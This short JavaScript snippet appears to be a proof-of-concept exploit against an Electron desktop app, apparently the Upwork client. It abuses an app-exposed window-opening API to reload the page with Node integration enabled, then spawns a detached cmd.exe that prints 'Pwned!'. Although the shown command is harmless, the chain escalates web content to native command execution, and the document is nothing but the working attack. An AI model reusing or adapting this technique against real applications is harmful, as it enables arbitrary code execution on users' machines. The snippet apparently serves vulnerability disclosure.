if (typeof require === 'undefined') {
  UTA.OSServices.otherRendererWindowOpen(location.href, '', {webPreferences:{nodeIntegration: true}}).then(function () {
    console.log('Done')
    // UTA.OSServices.callBrowserWindowMethod('destroy', []).then(console.log).catch(alert)
  }).catch(alert)
}else{
  var fs = require('fs')
  var out = fs.openSync('./out.log', 'a')
  var err = fs.openSync('./out.log', 'a')

  var cp = require('child_process')
  var child = cp.spawn('cmd', ['/c', 'start', 'cmd.exe', '/c', 'echo Pwned! Hello upwork! && pause'], { detached: true, stdio: [ 'ignore', out, err ] })
  child.unref()
  // require('electron').remote.getCurrentWindow().destroy()
}
